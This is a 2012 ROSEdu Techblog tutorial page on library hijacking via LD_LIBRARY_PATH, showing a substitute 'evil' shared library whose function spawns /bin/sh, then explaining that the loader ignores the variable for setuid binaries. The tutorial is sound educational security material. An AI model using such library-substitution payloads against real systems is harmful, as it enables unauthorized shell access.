<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<!--[if lt IE 7]>
<html class="no-js lt-ie9 lt-ie8 lt-ie7 ie" lang="en"> <![endif]-->
<!--[if IE 7]>
<html class="no-js lt-ie9 lt-ie8 ie" lang="en"> <![endif]-->
<!--[if IE 8]>
<html class="no-js lt-ie9 ie" lang="en"> <![endif]-->
<!--[if gt IE 8]><!-->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" class="no-js"><!--<![endif]-->
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>ROSEdu Techblog - Exploiting environment variables Part 2</title>
    <link rel="stylesheet" href="./css/style.css" type="text/css">
    <link rel="stylesheet" href="./css/rosedu_links.css" type="text/css">
    <link rel="stylesheet" href="./css/syntax.css" type="text/css">

    <script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

    <script type="text/javascript">
      var _gaq = _gaq || [];
      _gaq.push(['_setAccount', 'UA-7579199-6']);
      _gaq.push(['_trackPageview']);

      (function () {
        var ga = document.createElement('script');
        ga.type = 'text/javascript';
        ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0];
        s.parentNode.insertBefore(ga, s);
      })();
    </script>
  </head>

  <body>
    <div id="page" class="hentry">
      <header class="the-header">
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <nav class="nav-global">
              <ul>
                <li class="logo"><a href="./" title="Home">ROSEdu Techblog</a></li>
                <li class="about"><a href="./about.html">About</a></li>
                <li class="people"><a href="./people.html">People</a></li>
                <li class="archive"><a href="./archive.html">Archive</a></li>
                <li class="category"><a href="./tags.html">Tags</a></li>
              </ul>
            </nav>

            <hr />

            <nav class="nav-global">
              <ul>
                <li class="logo"><a href="./archive.html" title="Archive">Latest Posts</a></li>
                
                  <li><a href="./haskell-part1.html">A superficial exploration of Haskell - part 1</a></li>
                
                  <li><a href="./facebook-hackathon-live-blogging.html">Facebook Hackathon Live Blogging</a></li>
                
                  <li><a href="./shell-tips-and-tricks-for-file-editing.html">Shell tips and tricks for log files</a></li>
                
              </ul>
            </nav>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <div class="body" role="main">
        <div class="unit-body">
          <div class="unit-inner unit-body-inner">
            <div class="entry-content">
              <article class="unit-article layout-post">
                <div class="unit-inner unit-article-inner">
  <div class="content">
    <div class="bd">
      <header>
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <h1 class="h2 entry-title">
              <a class="post_title" href="./exploiting-environment-variables-part-2.html" title="Exploiting environment variables Part 2">Exploiting environment variables Part 2</a>
            </h1>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <span class="date">
      <span class="published">Published on April 23, 2012</span>
      by
      <span class="author">Alexandru Juncu</span>
      </span>

      <br />
      <span class="meta">
        Tagged:
        <span class="tags"><a href="./tags/gcc.html">gcc</a>, <a href="./tags/shared%20object.html">shared object</a>, <a href="./tags/dynamic%20library.html">dynamic library</a>, <a href="./tags/LD_LIBRARY_PATH.html">LD_LIBRARY_PATH</a></span>
      </span>

      <p>Based on the <a href="http://techblog.rosedu.org/exploiting-environment-variables.html">previous article</a>, let’s go one step further and study a similar exploit. This time we’ll be dealing with executables and <a href="http://techblog.rosedu.org/library-management.html">dynamic libraries</a>.</p>
<p>Let’s consider a simple custom library function:</p>
<pre class="sourceCode cpp"><code class="sourceCode cpp"><span class="co">/* random.h */</span>
<span class="dt">int</span> xkcd_random(<span class="dt">void</span>);

<span class="co">/* random.c */</span>
<span class="dt">int</span> xkcd_random()
{
	<span class="kw">return</span> <span class="dv">4</span>;
}</code></pre>
<p>We can build it into a shared library:</p>
<pre><code>$ gcc --share -fPIC -o librandom.so random.c</code></pre>
<p>Let’s take a simple program that uses our function:</p>
<pre class="sourceCode cpp"><code class="sourceCode cpp"><span class="co">/* main.c */</span>
<span class="ot">#include &lt;stdio.h&gt;</span>
<span class="ot">#include &quot;random.h&quot;</span>

<span class="dt">int</span> main(<span class="dt">void</span>)
{
	printf(<span class="st">&quot;8ball says:%d</span><span class="ch">\n</span><span class="st">&quot;</span>, xkcd_random());
	<span class="kw">return</span> <span class="dv">0</span>;
}</code></pre>
<p>If we want to use out shared object file in the current directory, we have to do two things. First, compile the program and link the shared library (with the <code>-l</code> flag) using libraries in the current directory (we do that using the <code>-L.</code> flag).</p>
<pre><code>$ gcc -o main -L.  main.c -lrandom</code></pre>
<p>Second, the library will be linked at compile time, but it won’t be loaded at runtime unless the loaded knows where the library is, with the help of the <code>LD_LIBRARY_PATH</code> variable.</p>
<pre><code>$ ./main ./main: error while loading shared libraries:
librandom.so: cannot open shared object file: No such file or directory
$ export LD_LIBRARY_PATH=.:$LD_LIBRARY_PATH
$ ./main
8ball says:4</code></pre>
<p>To ensure that we can always use the library, we can place it in the system’s library directory. Note that this means that we trust the code of that library and only the administrator can do this</p>
<pre><code># mv librandom.so /usr/lib</code></pre>
<p>So now, each time the main program runs, the loader will dynamically load the random function from the system. But what if we have another function, from another library that has the same name, but does something else:</p>
<pre class="sourceCode cpp"><code class="sourceCode cpp"><span class="co">/* evil.c */</span>
<span class="ot">#include &lt;unistd.h&gt;</span>
<span class="dt">int</span> xkcd_random()
{
	<span class="kw">return</span> <span class="dv">666</span>;
}

$ gcc --share -fPIC -o librandom.so evil.c</code></pre>
<p>If we overwrite the <code>LD_LIBRARY_PATH</code> variable with the <code>.</code> directory, the loader will use the <code>./librandom.so</code> instead of <code>/usr/lib/librandom.so</code> and it doesn’t require any modification of the main program (no recompile needed).</p>
<pre><code>$ ./main
8ball says:4
$ export LD_LIBRARY_PATH=.:LD_LIBRARY_PATH
$ ./main
8ball says:666</code></pre>
<p>This is a similar to the <code>PATH</code> variable hack discussed in the <a href="http://techblog.rosedu.org/exploiting-environment-variables.html">previous article</a>, but at a much more lower level. We can add a possible exploit here, like a shell execution:</p>
<pre class="sourceCode cpp"><code class="sourceCode cpp"><span class="ot">#include &lt;unistd.h&gt;</span>
<span class="dt">int</span> xkcd_random()
{
	execlp(<span class="st">&quot;/bin/sh&quot;</span>, <span class="st">&quot;/bin/sh&quot;</span>, NULL);
	<span class="kw">return</span> <span class="dv">666</span>;
}</code></pre>
<p>Like we did before, we used a root-owned executable that had the <code>SETUID</code> bit set, in order to run things as root.</p>
<pre><code>$ ls -la main
-rwsrwsr-x 1 root root 7192 2012-04-18 15:13 main
$ export LD_LIBRARY_PATH=.:LD_LIBRARY_PATH
$ ./main
8ball says:4</code></pre>
<p>The program executed safely.</p>
<p>The Library Loader is smart enough to ignore the <code>LD_LIBRARY_PATH</code> when the executable is setuid-ed, because of exact such attacks. So even though you can exploit programs as a normal user, you can’t affect system. So low level is a little more secure than scripting level.</p>
<p>Here is a related <a href="http://xahlee.org/UnixResource_dir/_/ldpath.html">article</a> that explains why <code>LD_LIBRARY_PATH</code> exists but also why it’s evil.</p>

    </div>
  </div>
</div>

<!-- Social Buttons here -->
<div id="sociallinks">
  <a href="https://twitter.com/home?status=/exploiting-environment-variables-part-2.html" target="_blank">Tweet this</a> -
  <a href="http://www.facebook.com/sharer/sharer.php?u=/exploiting-environment-variables-part-2.html" target="_blank">Like this</a> -
  <a href="https://plus.google.com/share?url=/exploiting-environment-variables-part-2.html" target="_blank">Share on G+</a>
</div>

<script>
  (function(){window.addEventListener("DOMContentLoaded",function(){
    //get URL
    var url=document.location;
    var links=document.getElementById("sociallinks")
                      .getElementsByTagName('a');
    for (var i=0;i!=links.length;i++){
      // Replacing /exploiting-environment-variables-part-2.html with current URL
      links[i].setAttribute("href",links[i].href.replace('/exploiting-environment-variables-part-2.html',url));
    }})})();
</script>
</br>

<div id="disqus_thread"></div>
<script type="text/javascript">
  /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
  var disqus_shortname = 'rosedutechblog';
  var disqus_url = window.location.href.split('/').splice(0,3).join("/")+'/exploiting-environment-variables-part-2.html';
  var title = 'Exploiting environment variables Part 2';
  /* * * DON'T EDIT BELOW THIS LINE * * */
  (function() {
    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
    dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

              </article>
            </div>
          </div>
        </div>
      </div>

      <footer class="the-footer">
        <div class="unit-foot">
          <div class="unit-inner unit-foot-inner">
            <div class="misc vcard">
              <h4>Social</h4>
              <div class="rss">
                <a href="http://techblog.rosedu.org/rss.xml" target="_blank">
                  <img src="./images/rss.png" alt="Subscribe to RSS Feed" />
                </a>
                <a href="http://www.reddit.com/submit?url='+encodeURIComponent(window.location)" target="_blank" onclick="window.location='http://www.reddit.com/submit?url='+encodeURIComponent(window.location); return false">
                  <img src="./images/reddit.png" alt="Submit to Reddit" />
                </a>
                <a href="http://twitter.com/share" class="twitter-share-button" data-count="none" target="_blank">
                  <img src="./images/twitter.png" alt="Submit to Twitter" />
                </a>
              </div>

              <h4>Powered by</h4>
              <ul>
                <li class="contact">
                  <address>
                    <a class="author fn n" href="http://www.rosedu.org">ROSEdu</a>
                  </address>
                </li>
                <li class="contact">
                  <address>
                    <a class="author fn n" href="http://jaspervdj.be/hakyll">Hakyll</a>
                  </address>
                </li>
              </ul>

              <h4>License</h4>
              <div class="bucket">
                <span>
                  <a rel="license" href="http://creativecommons.org/licenses/by/3.0/" title="Creative Commons Attribution 3.0 License">
                    <img src="//i.creativecommons.org/l/by/3.0/88x31.png" alt="License">
                  </a>
                </span>
                <span>
                  This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/3.0/" class="subfoot">Creative Commons Attribution 3.0 License</a>.
                </span>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  </body>
</html>
